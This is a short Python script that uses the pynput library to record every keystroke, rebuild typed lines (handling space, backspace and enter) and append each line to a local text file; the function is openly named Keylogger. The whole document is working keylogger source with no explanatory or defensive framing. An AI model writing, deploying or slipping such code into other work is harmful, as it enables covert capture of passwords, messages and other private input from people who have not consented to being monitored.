from pynput import keyboard; import os

result_string = ''
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')

def Keylogger(key):
    global result_string
    try:
        char = key.char
        result_string += char
    except AttributeError:
        if str(key) == 'Key.space':
            result_string+=' '
        if str(key) == 'Key.backspace':
            result_string = result_string[:-1]
        if str(key) == 'Key.enter':
            with open('/home/xic/file.txt', 'a') as file:
                file.write(result_string + '\n')
            result_string = ''
    except KeyboardInterrupt:
        print('')

with keyboard.Listener(on_press=Keylogger) as listener:
    listener.join()